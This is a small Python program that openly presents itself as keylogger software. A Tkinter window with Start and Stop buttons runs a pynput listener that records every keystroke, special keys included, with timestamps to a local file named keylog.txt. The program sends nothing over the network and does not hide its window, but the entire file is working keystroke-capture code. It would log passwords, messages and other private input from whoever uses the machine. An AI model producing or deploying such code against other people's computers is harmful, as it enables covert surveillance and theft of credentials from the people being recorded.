import threading
from pynput import keyboard
import logging
from tkinter import *

# Setup logging
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

listener = None  # Global listener object

# Define the key press function
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Function to start keylogging
def start_keylogging():
    global listener
    status_label.config(text="Status: Logging Started")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Function to stop keylogging
def stop_keylogging():
    global listener
    if listener:
        listener.stop()
        status_label.config(text="Status: Logging Stopped ")

# Tkinter UI setup
app = Tk()
app.title("Keylogger Controller")
app.geometry("300x200")
app.resizable(False, False)

Label(app, text="Keylogger Software", font=("Arial", 16)).pack(pady=10)

start_button = Button(app, text="Start Logging", bg="green", fg="white", command=lambda: threading.Thread(target=start_keylogging).start())
start_button.pack(pady=5)

stop_button = Button(app, text="Stop Logging", bg="red", fg="white", command=stop_keylogging)
stop_button.pack(pady=5)

status_label = Label(app, text="Status: Not Running", fg="blue")
status_label.pack(pady=10)

app.mainloop()
